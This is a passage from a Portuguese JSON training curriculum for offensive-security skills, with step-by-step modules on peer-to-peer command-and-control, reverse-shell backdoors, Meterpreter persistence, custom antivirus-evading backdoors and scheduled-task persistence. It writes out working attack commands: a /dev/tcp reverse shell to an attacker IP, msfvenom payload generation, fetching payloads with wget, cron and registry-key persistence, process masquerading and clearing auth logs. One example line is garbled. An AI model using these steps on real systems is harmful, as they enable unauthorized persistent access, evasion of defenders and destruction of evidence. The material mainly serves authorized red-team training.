                                    "Teste em rede real (ex: VPS diferentes) com Wireshark para tráfego P2P.",
                                    "Implemente obfuscation básica no tráfego (mimic HTTP/3).",
                                    "Documente bootstrap peers e rode deploy em targets simulados."
                                  ],
                                  "verification": "Deploy em 3 máquinas; operador envia comandos globais com sucesso >95%.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Docker",
                                    "Wireshark",
                                    "Máquinas de teste/VPS"
                                  ],
                                  "tips": "Use systemd para daemonize em Linux targets.",
                                  "learningObjective": "Validar deploy operacional completo.",
                                  "commonMistakes": [
                                    "Não testar NAT/firewall real",
                                    "Binário detectável por AV",
                                    "Falta de stealth em beacons"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team simulado, deploye 5 agentes C2 P2P em VMs representando endpoints corporativos. O operador, rodando em uma máquina separada, usa DHT para descobrir peers dinamicamente e envia comando 'whoami' via rotas obfuscadas, recebendo respostas sem tráfego para IPs fixos, simulando persistência em rede sem C2 central detectável.",
                              "finalVerifications": [
                                "Rede P2P conecta ≥3 peers sem servidor bootstrap central.",
                                "Comandos C2 roteados dinamicamente via DHT com latência <5s.",
                                "Tráfego criptografado e não detectável como C2 por Snort rules básicas.",
                                "Failover automático em perda de 50% dos peers.",
                                "Agente persiste e beaconiza a cada 60s sem crashes.",
                                "Zero vazamento de metadados de operador em pacotes capturados."
                              ],
                              "assessmentCriteria": [
                                "Funcionalidade: Todos steps executam sem erros em ambiente isolado (90%).",
                                "Resiliência: Rede sobrevive a falhas de 2/5 peers (80%).",
                                "Segurança: Criptografia E2E validada com ferramentas como Wireshark (100%).",
                                "Eficiência: Latência média <3s em comandos, uso CPU <20%.",
                                "Documentação: Código comentado com setup/deploy instructions.",
                                "Stealth: Tráfego passa como benigno em NIDS simulados."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Protocolos DHT e hole punching (CCNA/Nmap).",
                                "Criptografia: Noise/Libsodium para autenticação (Crypto 101).",
                                "Programação: Async JS e event-driven (Node.js avançado).",
                                "Segurança Ofensiva: Obfuscação C2 (OSCP/Metasploit).",
                                "DevOps: Dockerização e monitoramento (Kubernetes basics)."
                              ],
                              "realWorldApplication": "Em operações de threat hunting ou Red Team autorizado, arquiteturas C2 P2P evitam detecção por bloqueio de IPs de C2 tradicionais, permitindo controle distribuído em APT simulations, análise de IOCs em malware P2P como IPStorm, e treinamento para defensores detectarem comunicações descentralizadas em breaches."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.4.3.1"
                            ]
                          },
                          {
                            "id": "10.1.5.4.3.3",
                            "name": "Gerenciar resiliência em redes P2P C2",
                            "description": "Implementar failover, NAT traversal e criptografia end-to-end para manter o C2 operacional sob condições de rede adversas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Implementar NAT Traversal para Conectividade P2P",
                                  "subSteps": [
                                    "Estude protocolos STUN e TURN para descoberta de endereços públicos.",
                                    "Configure um servidor STUN/TURN usando ferramentas como coturn.",
                                    "Integre bibliotecas como libp2p ou pion/turn em sua aplicação C2 P2P.",
                                    "Teste hole punching UDP/TCP entre peers atrás de NATs simétricos.",
                                    "Registre endereços mapeados em um ledger distribuído para peers se reconectarem."
                                  ],
                                  "verification": "Verifique logs mostrando handshake bem-sucedido entre peers com IPs privados diferentes.",
                                  "estimatedTime": "3 horas",
                                  "materials": "VMs com NAT (VirtualBox), coturn server, Wireshark, Python com pylibp2p",
                                  "tips": "Comece com NAT cone simples antes de simétrico para depuração rápida.",
                                  "learningObjective": "Entender e aplicar técnicas de traversal para superar firewalls/NATs comuns.",
                                  "commonMistakes": "Ignorar timeouts de keep-alive, levando a falhas em NATs com bindings curtos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Mecanismos de Failover em Rede P2P",
                                  "subSteps": [
                                    "Implemente descoberta de peers via DHT (Distributed Hash Table) como Kademlia.",
                                    "Defina políticas de failover: priorize peers próximos por latência.",
                                    "Configure redirecionamento automático de tráfego para peers backup em caso de falha.",
                                    "Adicione gossip protocol para propagar status de peers vivos.",
                                    "Teste failover simulando falha de 50% dos peers."
                                  ],
                                  "verification": "Monitore métricas: tempo de reconexão < 30s após falha de peer primário.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Ferramentas como Sliver ou Covenant para C2 P2P, scripts Python para simulação de falhas",
                                  "tips": "Use heartbeats periódicos (10s) para detectar falhas precocemente.",
                                  "learningObjective": "Desenvolver sistemas auto-curativos que mantêm conectividade sem ponto único de falha.",
                                  "commonMistakes": "Sobrecarregar a rede com broadcasts excessivos em vez de gossip eficiente."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar Criptografia End-to-End",
                                  "subSteps": [
                                    "Selecione protocolo como Noise ou WireGuard para chaves efêmeras.",
                                    "Gere chaves assimétricas por peer e troque via Diffie-Hellman durante handshake.",
                                    "Encripte payloads C2 com AES-GCM, incluindo autenticação.",
                                    "Implemente rotação de chaves a cada sessão para forward secrecy.",
                                    "Valide integridade com HMAC em todos os pacotes."
                                  ],
                                  "verification": "Capture tráfego com Wireshark: confirme que payloads estão indecifráveis sem chaves.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Libs crypto: libsodium ou cryptography (Python), OpenSSL",
                                  "tips": "Use perfect forward secrecy (PFS) para proteção contra comprometimento futuro de chaves.",
                                  "learningObjective": "Garantir confidencialidade e integridade em comunicações P2P adversas.",
                                  "commonMistakes": "Reutilizar chaves de sessão, expondo histórico de comunicações."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Resiliência sob Condições Adversas",
                                  "subSteps": [
                                    "Simule rede instável: jitter, perda de pacotes >20%, latência >500ms.",
                                    "Injete falhas: desligue peers, bloqueie portas com iptables.",
                                    "Monitore uptime do C2: comandos devem executar com <5% falha.",
                                    "Analise logs para otimizar thresholds de retry e backoff exponencial.",
                                    "Documente relatório de resiliência com métricas quantitativas."
                                  ],
                                  "verification": "C2 operacional >95% do tempo durante 1 hora de teste adversarial.",
                                  "estimatedTime": "2 horas",
                                  "materials": "tc/netem para simulação de rede (Linux), scripts de automação Ansible",
                                  "tips": "Use backoff exponencial (1s, 2s, 4s...) para retries e evite thundering herd.",
                                  "learningObjective": "Validar implementação em cenários realistas de defesa ativa.",
                                  "commonMistakes": "Testar só em redes ideais, ignorando condições de produção adversas."
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernético, configure uma rede P2P C2 com Sliver em 5 VMs: 2 behind NAT doméstico, 2 em cloud com firewalls. Simule ataque de blue team bloqueando IPs; o C2 failover para peers alternos via STUN, mantendo comandos shell executando com criptografia Noise, sobrevivendo 2 horas de hunting.",
                              "finalVerifications": [
                                "Handshake P2P bem-sucedido apesar de NAT duplo.",
                                "Failover automático restaura C2 em <20s.",
                                "Tráfego criptografado resiste a análise passiva.",
                                "Uptime >98% sob perda de 30% de pacotes.",
                                "Nenhum comando C2 perdido durante simulação de falha total de 40% dos peers.",
                                "Logs confirmam rotação de chaves sem downtime."
                              ],
                              "assessmentCriteria": [
                                "Precisão na implementação de NAT traversal (sucesso em 90% dos testes).",
                                "Eficiência de failover (tempo médio <15s).",
                                "Segurança da criptografia (auditoria manual confirma PFS e autenticação).",
                                "Resiliência quantitativa (métricas de uptime validadas).",
                                "Documentação clara de design e testes.",
                                "Capacidade de depuração sob pressão."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Protocolos UDP/TCP, DHT em sistemas distribuídos.",
                                "Criptografia: Protocolos Noise, PFS, autenticação mútua.",
                                "Programação: Assincronia em Python/Go para redes reativas.",
                                "Sistemas Distribuídos: Consenso e gossip protocols.",
                                "Segurança Ofensiva: IOCs evasion em red teaming."
                              ],
                              "realWorldApplication": "Em operações APT persistentes, como campanhas de malware P2P (ex: Emotet), mantém C2 operacional contra takedowns de C2 servers centralizados, NATs residenciais e detecção por EDRs, permitindo exfiltração contínua de dados em ambientes corporativos hostis."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.4.3.2"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.5",
                    "name": "Técnicas de Persistência em C2",
                    "description": "Métodos para manter acesso remoto, incluindo backdoors, scheduled tasks e pivoting em redes.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.5.1",
                        "name": "Backdoors para Persistência",
                        "description": "Técnicas para implantar backdoors que permitem acesso remoto contínuo a sistemas comprometidos, garantindo comunicação persistente com o servidor de Comando e Controle (C2).",
                        "specificSkills": [
                          {
                            "id": "10.1.5.5.1.1",
                            "name": "Implantar Backdoor via Shell Reverso",
                            "description": "Configurar e executar um shell reverso usando ferramentas como Netcat ou Meterpreter para criar uma conexão de volta ao atacante, garantindo acesso remoto persistente mesmo após reinicializações.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Listener no Sistema Atacante",
                                  "subSteps": [
                                    "Identifique o IP e porta disponíveis no atacante (ex: use ifconfig ou ip addr para IP).",
                                    "Inicie o Netcat listener com comando: nc -lvp 4444 (ou escolha porta livre).",
                                    "Alternativamente, configure Meterpreter listener no Metasploit: msfconsole > use multi/handler > set payload windows/meterpreter/reverse_tcp > set LHOST <IP> > set LPORT 4444 > exploit.",
                                    "Teste a conectividade básica com ping da vítima para o atacante.",
                                    "Registre logs do listener para monitoramento futuro."
                                  ],
                                  "verification": "Listener rodando sem erros, aguardando conexões (verifique com netstat -tlnp | grep 4444).",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Kali Linux VM",
                                    "Netcat (nc)",
                                    "Metasploit Framework",
                                    "Terminal"
                                  ],
                                  "tips": "Use firewall ufw allow 4444 se necessário; prefira portas acima de 1024 para evitar privilégios root.",
                                  "learningObjective": "Entender configuração de servidores de escuta para shells reversos e ferramentas como Netcat/Metasploit.",
                                  "commonMistakes": [
                                    "Porta já em uso",
                                    "Firewall bloqueando porta",
                                    "IP incorreto do atacante"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar o Payload de Shell Reverso na Vítima",
                                  "subSteps": [
                                    "No sistema vítima, crie script bash para reverse shell: echo 'bash -i >& /dev/tcp/<ATACKER_IP>/4444 0>&1' > /tmp/revshell.sh.",
                                    "Torne executável: chmod +x /tmp/revshell.sh.",
                                    "Para Meterpreter, gere payload com msfvenom: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATACKER_IP> LPORT=4444 -f exe > backdoor.exe (para Windows).",
                                    "Ofusque o payload se necessário (ex: base64 encode para bash).",
                                    "Teste localmente o payload em ambiente isolado."
                                  ],
                                  "verification": "Payload gerado e testável (execute em máquina local para validar sintaxe).",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Sistema vítima VM (Ubuntu/Windows)",
                                    "msfvenom",
                                    "Editor de texto (nano/vi)"
                                  ],
                                  "tips": "Substitua <ATACKER_IP> corretamente; use variáveis de ambiente para dinamizar.",
                                  "learningObjective": "Dominar geração de payloads reversos com Netcat e Metasploit para diferentes OS.",
                                  "commonMistakes": [
                                    "IP atacante errado no payload",
                                    "Payload não executável",
                                    "Sintaxe bash inválida"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implantar e Executar o Payload na Vítima",
                                  "subSteps": [
                                    "Transfira payload para vítima via wget/curl (ex: wget http://<ATACKER_IP>/revshell.sh).",
                                    "Execute: ./revshell.sh ou ./backdoor.exe.",
                                    "No atacante, observe conexão chegando no listener.",
                                    "Eleve privilégios se necessário (ex: no shell, use sudo ou whoami).",
                                    "Estabilize shell com Python PTY: python -c 'import pty; pty.spawn(\"/bin/bash\")'."
                                  ],
                                  "verification": "Shell reverso conectado no listener do atacante (comando ls/ifconfig funcionam).",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Servidor web simples no atacante (python -m http.server 80)",
                                    "Payload gerado"
                                  ],
                                  "tips": "Use transfer.sh ou ngrok para bypass NAT; execute em background com nohup.",
                                  "learningObjective": "Executar implantação de backdoor e estabilizar sessão remota.",
                                  "commonMistakes": [
                                    "Falha na transferência (firewall)",
                                    "Execução sem permissões",
                                    "Conexão cai por timeout"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Garantir Persistência Após Reinicializações",
                                  "subSteps": [
                                    "Crie cron job na vítima: crontab -e > @reboot /tmp/revshell.sh.",
                                    "Para Windows, adicione a registry: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d \"C:\\path\\backdoor.exe\".",
                                    "Use Metasploit persistence module: run persistence -U -i 10 -p 4444 -r <ATACKER_IP>.",
                                    "Reinicie vítima e verifique reconexão automática.",
                                    "Monitore e limpe logs na vítima (ex: echo '' > /var/log/auth.log)."
                                  ],
                                  "verification": "Após reboot da vítima, shell reconecta automaticamente no listener.",
                                  "estimatedTime": "20-25 minutos",
                                  "materials": [
                                    "Acesso shell inicial",
                                    "crontab/regedit"
                                  ],
                                  "tips": "Teste em VM snapshot; evite detecção com nomes inocentes para jobs.",
                                  "learningObjective": "Implementar mecanismos de persistência para backdoors em C2.",
                                  "commonMistakes": [
                                    "Cron não @reboot syntax",
                                    "Antivírus detecta payload",
                                    "Sem cleanup de logs"
                                  ]
                                }
                              ],
                              "practicalExample": "Em lab com Kali (atacante IP 192.168.1.100) e Ubuntu vítima: 1. nc -lvp 4444 no Kali. 2. Na vítima: bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 >/dev/tcp/192.168.1.100/4444 0>&1. 3. Execute, receba shell. 4. Crie @reboot cron, reboot e confirme reconexão.",
                              "finalVerifications": [
                                "Listener recebe conexão reversa da vítima.",
                                "Comandos remotos executam sem erros (ls, whoami, pwd).",
                                "Persistência funciona após reboot da vítima.",
                                "Elevação de privilégios possível se aplicável.",
                                "Logs não revelam atividade óbvia.",
                                "Conexão sobrevive a desconexões de rede curtas."
                              ],
                              "assessmentCriteria": [
                                "Execução completa sem falhas de conectividade.",
                                "Persistência confirmada em pelo menos 2 reinicializações.",
                                "Uso correto de ferramentas (Netcat/Metasploit).",
                                "Estabilização do shell demonstrada.",
                                "Medidas anti-detecção aplicadas (ex: ofuscação).",
                                "Relato de verificações finais fornecido."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entendimento de TCP/IP e handshakes reversos.",
                                "Programação: Scripts bash e automação com msfvenom.",
                                "Sistemas Operacionais: Gerenciamento de cron, registry e processos.",
                                "Ética em Cibersegurança: Uso apenas em ambientes controlados.",
                                "Análise Forense: Limpeza de logs e IOCs."
                              ],
                              "realWorldApplication": "Ataques APT como APT29 usam shells reversos para manter C2 persistente pós-exploit inicial, permitindo exfiltração de dados em infraestruturas corporativas comprometidas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.1.2",
                            "name": "Persistência com Meterpreter",
                            "description": "Utilizar o módulo persistence do Meterpreter para injetar um payload que se auto-inicia no sistema Windows ou Linux, mantendo a sessão C2 ativa.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Estabelecer uma Sessão Meterpreter Ativa",
                                  "subSteps": [
                                    "Inicie o Metasploit console com 'msfconsole'.",
                                    "Selecione um exploit compatível com o alvo (ex: eternalblue para Windows).",
                                    "Configure o payload para meterpreter (ex: windows/meterpreter/reverse_tcp).",
                                    "Defina LHOST e LPORT para sua máquina atacante.",
                                    "Execute o exploit para obter uma sessão Meterpreter ativa.",
                                    "Interaja com a sessão usando 'sessions -i <ID>'."
                                  ],
                                  "verification": "Confirme a sessão ativa executando 'getuid' no Meterpreter e vendo o usuário do sistema alvo.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Metasploit Framework instalado",
                                    "Máquina vítima (VM Windows/Linux)",
                                    "Kali Linux ou equivalente"
                                  ],
                                  "tips": "Use payloads staged para sessões mais estáveis em redes restritas.",
                                  "learningObjective": "Compreender como obter shell interativo via Meterpreter para preparar persistence.",
                                  "commonMistakes": [
                                    "Esquecer de configurar LHOST corretamente",
                                    "Usar payload incompatível com o OS alvo",
                                    "Não verificar firewall no alvo"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar o Módulo Persistence",
                                  "subSteps": [
                                    "No Meterpreter, digite 'background' para voltar ao msfconsole.",
                                    "Carregue o módulo com 'use post/multi/manage/persistence'.",
                                    "Defina SESSION para o ID da sessão ativa.",
                                    "Configure opções: LHOST, LPORT, STARTUP (ex: auto para Windows).",
                                    "Para Linux, ajuste SESSION e payload para linux/x86/meterpreter/reverse_tcp.",
                                    "Visualize configurações com 'show options'."
                                  ],
                                  "verification": "Execute 'show options' e confirme que todas as opções obrigatórias estão definidas sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Sessão Meterpreter ativa",
                                    "Documentação Metasploit persistence"
                                  ],
                                  "tips": "Para Windows, use STARTUP=User para execução no login do usuário atual.",
                                  "learningObjective": "Aprender a personalizar o módulo persistence para diferentes OS.",
                                  "commonMistakes": [
                                    "Definir LHOST incorreto",
                                    "Ignorar diferenças entre Windows e Linux",
                                    "Não especificar SESSION"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar o Módulo e Injetar Payload",
                                  "subSteps": [
                                    "Execute o módulo com 'run' ou 'exploit'.",
                                    "Monitore a saída para confirmação de instalação (ex: service ou registry key criada).",
                                    "Verifique processos no alvo com 'ps' no Meterpreter.",
                                    "Anote o caminho do executável injetado (ex: %APPDATA% para Windows).",
                                    "Teste conexão imediata com novo listener: 'multi/handler'.",
                                    "Saia da sessão atual com 'exit'."
                                  ],
                                  "verification": "Nova sessão abre automaticamente ao configurar handler com mesmas LHOST/LPORT.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Handler configurado: use multi/handler; set payload correspondente"
                                  ],
                                  "tips": "Use PREPEND_FORK para evitar detecção em processos pai.",
                                  "learningObjective": "Executar injeção de persistence mantendo C2 discreto.",
                                  "commonMistakes": [
                                    "Executar sem handler pronto",
                                    "Payload incompatível causando falha silenciosa",
                                    "Não anotar caminhos para depuração"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar Persistência Após Reinicialização",
                                  "subSteps": [
                                    "Reinicie a máquina vítima (shutdown -r no Linux ou reboot no Windows).",
                                    "Configure handler novamente e aguarde reconexão automática.",
                                    "Interaja com a nova sessão e execute 'getuid' e 'sysinfo'.",
                                    "Remova a persistence se necessário: use autoruns ou manual delete.",
                                    "Documente logs de conexão para análise.",
                                    "Teste em ambos OS se possível."
                                  ],
                                  "verification": "Sessão reconecta em até 2 minutos pós-reboot sem intervenção manual.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "VM com snapshot para reset",
                                    "Ferramentas como Autoruns para Windows"
                                  ],
                                  "tips": "Crie snapshot antes do reboot para testes repetíveis.",
                                  "learningObjective": "Validar eficácia da persistence em cenários realistas de reboot.",
                                  "commonMistakes": [
                                    "Não aguardar tempo suficiente pós-reboot",
                                    "Falhar em configurar handler persistente",
                                    "Ignorar AV que bloqueia payload"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com Kali atacante e VM Windows 10 vítima: 1) Exploit ms17_010_eternalblue para meterpreter. 2) use post/multi/manage/persistence; set SESSION 1; set LHOST 192.168.1.100; set LPORT 4444; run. 3) Reboot VM. 4) msfconsole > use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST/LPORT; exploit -j. Sessão reconecta automaticamente.",
                              "finalVerifications": [
                                "Sessão Meterpreter reconecta após reboot do alvo.",
                                "Payload persiste sem detecção imediata por AV básico.",
                                "Comando 'ps' mostra processo filho discreto.",
                                "Registry key ou cron job criado corretamente (verificar com reg query ou crontab -l).",
                                "C2 mantém estabilidade por 10+ minutos.",
                                "Funciona em Windows e Linux com payloads adequados."
                              ],
                              "assessmentCriteria": [
                                "Configurações do módulo 100% corretas sem erros.",
                                "Persistence sobrevive a reboot em <2 minutos.",
                                "Documentação completa de caminhos e logs.",
                                "Diferenças Windows/Linux explicadas.",
                                "Limpeza pós-teste realizada.",
                                "Nenhuma detecção por ferramentas básicas como netstat."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entendimento de reverse shells e C2 over TCP.",
                                "Sistemas Operacionais: Registry, services, cron jobs em Win/Linux.",
                                "Programação: Análise de payloads em Ruby (Metasploit).",
                                "Segurança Defensiva: Detecção de IOCs como processos suspeitos.",
                                "Ética: Discussão de uso apenas em ambientes controlados."
                              ],
                              "realWorldApplication": "Em operações de Red Team durante exercícios de Cyber Range, mantém acesso C2 em alvos comprometidos apesar de reboots ou hunts de IOCs, simulando APT persistence para treinar Blue Teams em detecção e remediação."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.1.3",
                            "name": "Criação de Backdoor Personalizado",
                            "description": "Desenvolver um backdoor simples em Python ou PowerShell que se disfarça como processo legítimo, evadindo detecção básica de antivírus.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisa e Planejamento de Conceitos de Backdoor",
                                  "subSteps": [
                                    "Estude definições de backdoors e técnicas de persistência em C2 (Command and Control).",
                                    "Analise exemplos conceituais de backdoors em Python e PowerShell de fontes éticas como documentação MITRE ATT&CK.",
                                    "Identifique processos legítimos comuns no Windows (ex: svchost.exe) para disfarce.",
                                    "Planeje arquitetura: conexão reversa, listener C2 simulado e payload mínimo.",
                                    "Defina escopo ético: uso exclusivo em ambientes controlados de laboratório."
                                  ],
                                  "verification": "Criação de um documento de planejamento com diagrama de fluxo e lista de componentes.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentação MITRE ATT&CK (T1053, T1543), VMWare/VirtualBox para lab isolado, Notepad++ ou VS Code"
                                  ],
                                  "tips": "Use sempre máquinas virtuais isoladas da rede real para evitar riscos legais.",
                                  "learningObjective": "Compreender os componentes fundamentais de um backdoor e implicações éticas em cibersegurança ofensiva.",
                                  "commonMistakes": [
                                    "Ignorar considerações legais e éticas, testando em ambientes de produção; subestimar detecção comportamental."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desenvolvimento do Payload Básico do Backdoor",
                                  "subSteps": [
                                    "Crie um script Python simples com socket para conexão reversa a um C2 simulado.",
                                    "Implemente comandos básicos: shell execution, keylogging simulado e exfiltração de dados fictícios.",
                                    "Adicione loop de reconexão para persistência em caso de falha de conexão.",
                                    "Teste localmente o payload em modo debug sem disfarce.",
                                    "Otimize para tamanho mínimo para reduzir assinaturas."
                                  ],
                                  "verification": "Script executa e mantém conexão estável com C2 local por 10 minutos sem crashes.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Python 3.x instalado em VM Windows, netcat ou servidor C2 simulado como Covenant/ Empire free tier"
                                  ],
                                  "tips": "Use bibliotecas padrão como socket e subprocess para evitar dependências detectáveis.",
                                  "learningObjective": "Desenvolver funcionalidade core de um backdoor com comunicação C2 reversa.",
                                  "commonMistakes": [
                                    "Hardcoding IPs reais; não ofuscar strings de rede que AVs assinam."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementação de Disfarce como Processo Legítimo",
                                  "subSteps": [
                                    "Renomeie o executável para imitar um processo comum (ex: svchost_updater.exe).",
                                    "Use técnicas de injeção de processo ou fork para rodar sob processo pai legítimo.",
                                    "Adicione ícone e versão info falsos usando pyinstaller ou similar para compilação.",
                                    "Implemente sleep intervals e user-mode execution para mimetizar comportamento normal.",
                                    "Ofusque código com base64 ou simple XOR para evasão estática básica."
                                  ],
                                  "verification": "Processo aparece no Task Manager como legítimo e não levanta suspeitas visuais.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "PyInstaller para empacotamento EXE, Resource Hacker para edição de ícones/metadata"
                                  ],
                                  "tips": "Estude processos reais com Process Explorer para copiar argumentos e caminhos realistas.",
                                  "learningObjective": "Aplicar técnicas de masquerading para evasão de inspeção visual e estática.",
                                  "commonMistakes": [
                                    "Disfarces óbvios como nomes genéricos sem metadata; ignorar análise comportamental."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Teste de Evasão de Detecção Básica de Antivírus",
                                  "subSteps": [
                                    "Compile o backdoor e escaneie com AVs gratuitos (Windows Defender, Avast free).",
                                    "Monitore detecções: signatures, heurísticas e sandboxing.",
                                    "Ajuste ofuscação iterativamente (ex: string encryption, API hashing).",
                                    "Teste em VM limpa com atualizações de AV para validar evasão básica.",
                                    "Registre logs de detecção para análise posterior."
                                  ],
                                  "verification": "Backdoor executa sem detecção em pelo menos 3 AVs básicos por 30 minutos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "VMs frescas com AVs instalados, VirusTotal para scan online (apenas hashes, não upload)"
                                  ],
                                  "tips": "Evite upload para VirusTotal; foque em testes locais para sigilo.",
                                  "learningObjective": "Avaliar e mitigar detecções básicas de AV em payloads personalizados.",
                                  "commonMistakes": [
                                    "Testar apenas uma vez; não considerar EDRs avançados mesmo em simulação."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Persistência, Implantação e Verificação Final",
                                  "subSteps": [
                                    "Configure persistência via registry (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run).",
                                    "Implante em VM target e verifique auto-início após reboot.",
                                    "Teste C2 full cycle: comando execution, beaconing e cleanup simulado.",
                                    "Analise logs de rede e disco para stealth.",
                                    "Documente defesas que falharam para relatório de lições aprendidas."
                                  ],
                                  "verification": "Backdoor persiste por 3 reboots e responde a C2 sem alertas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Regedit, Wireshark para monitoramento de tráfego, ProcMon para eventos de disco/processo"
                                  ],
                                  "tips": "Use caminhos de usuário para evitar UAC prompts em persistência.",
                                  "learningObjective": "Garantir persistência e controle remoto em ambiente simulado.",
                                  "commonMistakes": [
                                    "Persistência óbvia em HKLM; tráfego C2 não criptografado."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team, desenvolva um backdoor Python compilado como 'windows_update_helper.exe' que se conecta reversamente a um servidor C2 local na porta 4444, executa comandos como 'whoami' e persiste via Run key, evadindo Windows Defender em modo real-time básico.",
                              "finalVerifications": [
                                "Backdoor inicia automaticamente após reboot sem detecção visual.",
                                "Conexão C2 reversa estabelecida e comandos executados remotamente.",
                                "Nenhuma detecção por AVs básicos em scans estáticos/dinâmicos.",
                                "Processo disfarçado listado corretamente no Task Manager.",
                                "Persistência mantida por 1 hora com sleep intervals realistas.",
                                "Logs de rede mostram beaconing stealth sem payloads suspeitos."
                              ],
                              "assessmentCriteria": [
                                "Funcionalidade completa: C2 comunicação e execução de comandos (30%).",
                                "Evasão eficaz: sem detecções em AVs básicos (25%).",
                                "Stealth e disfarce: indistinguível de processos legítimos (20%).",
                                "Persistência robusta: sobrevive reboots e falhas de rede (15%).",
                                "Documentação ética e lições aprendidas (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Programação (Python/PowerShell scripting e ofuscação).",
                                "Redes (protocolos TCP/UDP, evasão de firewalls).",
                                "Sistemas Operacionais (gerenciamento de processos Windows, registry).",
                                "Ética e Direito (leis de cibersegurança, uso ético em pentests).",
                                "Análise Forense (detecção de IOCs e hunting)."
                              ],
                              "realWorldApplication": "Em simulações de Jogos de Guerra Cibernética ou Red Team engagements autorizados, testar defesas de persistência em C2, ajudando Blue Teams a melhorar detecções de backdoors em ambientes corporativos ou governamentais."
                            },
                            "estimatedTime": "5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.5.2",
                        "name": "Tarefas Agendadas para Persistência",
                        "description": "Métodos para agendar tarefas no sistema operacional que executam payloads maliciosos periodicamente, assegurando reconexão ao C2 sem intervenção manual.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.5.2.1",
                            "name": "Agendar Tarefa no Windows com schtasks",
                            "description": "Usar o comando schtasks.exe para criar tarefas agendadas que executam scripts PowerShell ou executáveis conectados ao C2, configurando execução ao logon ou em intervalos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente e Verificar Permissões",
                                  "subSteps": [
                                    "Inicie uma Máquina Virtual (VM) Windows 10/11 isolada para testes de segurança.",
                                    "Abra o Prompt de Comando (CMD) como Administrador (clique direito > Executar como administrador).",
                                    "Execute 'schtasks /query' para listar tarefas existentes e confirmar acesso.",
                                    "Crie um diretório de teste: 'mkdir C:\\C2Test' e navegue para ele.",
                                    "Crie um script PowerShell de teste simples (ex: Test.ps1) que faz um ping para um IP simulado de C2."
                                  ],
                                  "verification": "O comando 'schtasks /query' executa sem erros de permissão e lista tarefas do sistema.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "VM Windows 10/11",
                                    "Direitos de administrador",
                                    "Editor de texto (Notepad++)"
                                  ],
                                  "tips": "Use sempre VMs isoladas para evitar impactos em hosts reais; desabilite UAC temporariamente se necessário.",
                                  "learningObjective": "Preparar um ambiente seguro e com permissões adequadas para manipulação de tarefas agendadas.",
                                  "commonMistakes": [
                                    "Executar CMD sem privilégios de admin (falha com erro 0x80070005)",
                                    "Usar máquina de produção em vez de VM",
                                    "Ignorar Policy Group que bloqueia schtasks"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar a Sintaxe Básica do Comando schtasks /create",
